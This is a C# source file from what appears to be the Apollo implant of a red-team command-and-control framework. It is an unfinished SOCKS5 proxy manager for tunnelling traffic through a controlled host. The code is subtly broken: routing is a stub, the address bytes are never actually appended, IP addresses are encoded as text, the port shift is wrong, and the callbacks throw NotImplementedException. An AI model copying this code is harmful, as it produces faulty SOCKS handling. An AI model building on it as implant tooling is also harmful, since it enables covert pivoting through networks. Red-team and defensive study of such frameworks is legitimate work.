using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Collections.Concurrent;
using ApolloInterop.Classes;
using System.Net.Sockets;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Enums.ApolloEnums;
using static ApolloInterop.Structs.MythicStructs.MessageResponse;
using System.Net;

namespace Apollo.Management.Socks
{
    public class SocksManager : AI.Classes.SocksManager
    {
        private ConcurrentDictionary<int, AsyncTcpClient> _connections = new ConcurrentDictionary<int, AsyncTcpClient>();

        public SocksManager(IAgent agent) : base(agent)
        {

        }

        public override bool Route(SocksDatagram dg)
        {
            byte[] data = Convert.FromBase64String(dg.Data);
            if (data.Length < 3)
            { return false; }
            byte[] header = data.Take(3).ToArray();
            return true;
        }
    }

    public class SocksClient : ITcpClientCallback
    {
        public SocksClient()
        {

        }
        // I think this is dumb.
        internal static SocksDatagram CreateDatagram(int id, Socks5Error err, HostEndpoint host)
        {
            List<byte> addrBody = new List<byte>();
            switch(host.AddrType)
            {
                case Socks5AddressType.FQDN:
                    addrBody.Add((byte)host.FQDN.Length);
                    addrBody.Concat(Encoding.UTF8.GetBytes(host.FQDN));
                    break;
                case Socks5AddressType.IPv4:
                    addrBody.Concat(Encoding.UTF8.GetBytes(host.Ip.Address.ToString()));
                    break;
                case Socks5AddressType.IPv6:
                    addrBody.Concat(Encoding.UTF8.GetBytes(host.Ip.Address.ToString()));
                    break;
                default:
                    throw new Exception("No address type set.");
            }

            int bodyLen = addrBody.Count;
            byte[] message = new byte[6 + bodyLen];
            message[0] = (byte)SocksVersion.Socks5;
            message[1] = (byte)err;
            message[2] = 0; // reserved
            message[3] = (byte)host.AddrType;
            Buffer.BlockCopy(addrBody.ToArray(), 0, message, 4, bodyLen);
            message[4 + bodyLen] = (byte)(host.Port >> 8);
            message[5 + bodyLen] = (byte)(host.Port >> 0xff);

            return new SocksDatagram()
            {
                Data = Convert.ToBase64String(message)
            };
        }

        public void OnAsyncConnect(TcpClient client, out object state)
        {
            throw new NotImplementedException();
        }

        public void OnAsyncDisconnect(TcpClient client, object state)
        {
            throw new NotImplementedException();
        }

        public void OnAsyncMessageReceived(TcpClient client, IPCData data, object state)
        {
            throw new NotImplementedException();
        }
    }
}
